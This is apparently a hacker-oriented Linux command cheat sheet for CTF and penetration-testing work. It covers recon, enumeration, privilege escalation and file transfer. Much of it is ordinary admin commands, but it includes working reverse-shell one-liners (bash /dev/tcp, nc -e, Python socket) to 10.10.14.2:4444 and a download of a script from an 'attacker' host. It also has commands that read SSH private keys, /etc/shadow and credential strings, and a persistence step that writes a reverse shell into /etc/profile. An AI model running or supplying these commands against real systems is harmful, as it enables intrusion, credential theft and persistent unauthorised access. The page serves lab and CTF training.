---
icon: linux
---

# Linux Commands 4 Hackers

## **Linux Commands for Hackers — Operator Command Arsenal**

***

### I. 🧩 Reconnaissance & System Discovery

#### 🧠 Basic Info

```bash
whoami               # current user
id                   # UID, GID, groups
hostname             # machine name
uname -a             # kernel info
cat /etc/*release    # distro info
uptime               # system uptime
```

#### ⚙️ Hardware & Environment

```bash
lscpu                # CPU info
lsblk                # block devices
df -hT               # disks + types
free -h              # memory
lspci / lsusb        # hardware enumeration
dmidecode            # BIOS, manufacturer info
```

#### 💡 Network Recon

```bash
ip a                 # interfaces & IPs
ip r                 # routing table
netstat -tulnp       # open ports (deprecated)
ss -tulnp            # preferred socket view
arp -a               # ARP cache
ifconfig / iwconfig  # interface info (legacy)
route -n             # routing table
```

***

### II. 🧭 Enumeration & Privilege Escalation Aids

#### 🧠 User & Group Enumeration

```bash
cat /etc/passwd | cut -d: -f1
grep -i "sudo" /etc/group
getent passwd root
```

#### 🔒 Sudo Privileges

```bash
sudo -l
sudo -ll | grep "NOPASSWD"
```

#### ⚙️ Cronjobs & Timers

```bash
cat /etc/crontab
ls -la /etc/cron.*
systemctl list-timers
```

#### 🔑 Files with SUID/SGID Bits

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

#### 🧠 Writable Directories

```bash
find / -writable -type d 2>/dev/null
```

***

### III. 🧩 File & Data Discovery

#### 🔍 File Search

```bash
find / -name "flag*" 2>/dev/null
find /home -iname "*.txt"
```

#### 🔑 Credential Patterns

```bash
grep -i -r "password" /etc 2>/dev/null
grep -i "pass\|secret\|token" -r /home 2>/dev/null
```

#### 📜 Configs & History

```bash
cat ~/.bash_history
cat ~/.ssh/id_rsa
cat ~/.ssh/known_hosts
ls -la /etc/ssh/
cat /var/log/auth.log | tail -n 20
```

***

### IV. 🧰 File Operations & Manipulation

#### ⚙️ Basic Ops

```bash
cp, mv, rm, touch, mkdir, rmdir, ln -s
```

#### 🧱 Text Handling

```bash
cat, less, head, tail, sort, uniq, cut, awk, sed
```

#### 🧮 Count & Filter

```bash
wc -l file.txt
grep "pattern" file.txt
grep -r "pattern" /etc/
awk -F: '{print $1,$3,$6}' /etc/passwd
```

***

### V. 🛰️ Networking & Remote Access

#### 🌐 Connections

```bash
ping -c 4 target
traceroute target
curl -I https://target
wget https://target/file
```

#### 🔁 Tunnels

```bash
ssh user@host
scp file user@host:/path/
rsync -avz /dir/ user@host:/dest/
```

#### 🔄 Port Forwarding

```bash
ssh -L 8080:127.0.0.1:80 user@target
```

#### ⚙️ Reverse Shells (Manual)

```bash
bash -i >& /dev/tcp/10.10.14.2/4444 0>&1
nc -e /bin/sh 10.10.14.2 4444
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.2",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

***

### VI. 🧱 Privilege Escalation – Enumeration Shortcuts

#### 🔎 Kernel Exploits

```bash
uname -r
searchsploit linux kernel 4.4
```

#### 🧠 Capabilities

```bash
getcap -r / 2>/dev/null
```

#### 🔐 Password Files

```bash
cat /etc/shadow
sudo cat /etc/shadow
```

#### 💥 Misconfig Escalation

```bash
find / -type f -perm /6000 2>/dev/null
find / -type f -name "*.sh" -writable
```

***

### VII. 🧩 Process & Service Inspection

#### 🔎 Running Processes

```bash
ps aux
top / htop
pgrep -a apache
```

#### ⚙️ Services

```bash
systemctl list-units --type service
service --status-all
```

#### 🧠 Background Jobs

```bash
jobs
fg %1
bg %1
```

***

### VIII. 🧱 Archive & Transfer Arsenal

```bash
tar -czf archive.tar.gz /dir/
tar -xzf archive.tar.gz
zip -r files.zip /folder/
unzip files.zip
scp files.zip user@host:/tmp
wget http://attacker/file.sh -O /tmp/file.sh
curl -o /tmp/file.sh http://attacker/file.sh
base64 file > file.b64
base64 -d file.b64 > file
```

***

### IX. 🧠 Quick Shell Tricks

```bash
alias ll='ls -la'
history | grep ssh
export PATH=/usr/local/bin:/usr/bin:/bin
strings binary | grep flag
file /bin/ls
ldd /bin/bash
```

***

### X. ⚡ Process Injection & Debugging (Legal/Lab Only)

```bash
strace -f ./binary
ltrace ./program
gdb -q ./binary
readelf -a binary
objdump -d binary | less
```

***

### XI. 📜 Persistence & Defense Evasion (Lab Simulation)

```bash
echo "@reboot /home/user/script.sh" | crontab -
echo "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1" > /etc/profile
```

***

### XII. 🔥 Operators’ Reference Table

| Category    | Command                       | Description            |
| ----------- | ----------------------------- | ---------------------- |
| Recon       | `uname -a`, `id`, `whoami`    | System, user, kernel   |
| Network     | `ss -tulnp`, `ip a`           | Socket + IP mapping    |
| Files       | `find / -name flag*`          | Quick search           |
| PrivEsc     | `sudo -l`, `getcap -r /`      | Check escalation paths |
| Persistence | `crontab -l`, `/etc/rc.local` | Scheduled persistence  |
| Transfer    | `scp`, `curl`, `wget`, `nc`   | Move files quickly     |
| Debug       | `strace`, `ltrace`, `gdb`     | Reverse/debug binaries |

***

### XIII. 🧠 CTF Workflow Snippets

**Privilege escalation checklist**

```bash
whoami && id
sudo -l
ls -la /home
find / -perm -4000 2>/dev/null
cat /etc/crontab
```

**Flag hunting**

```bash
find / -type f -iname "*flag*" 2>/dev/null
grep -r "flag{" /home /opt 2>/dev/null
```

**Enumeration summary script**

```bash
echo "[+] USER:" $(whoami)
echo "[+] HOST:" $(hostname)
echo "[+] KERNEL:" $(uname -r)
sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null | tee /tmp/suid.txt
```

***
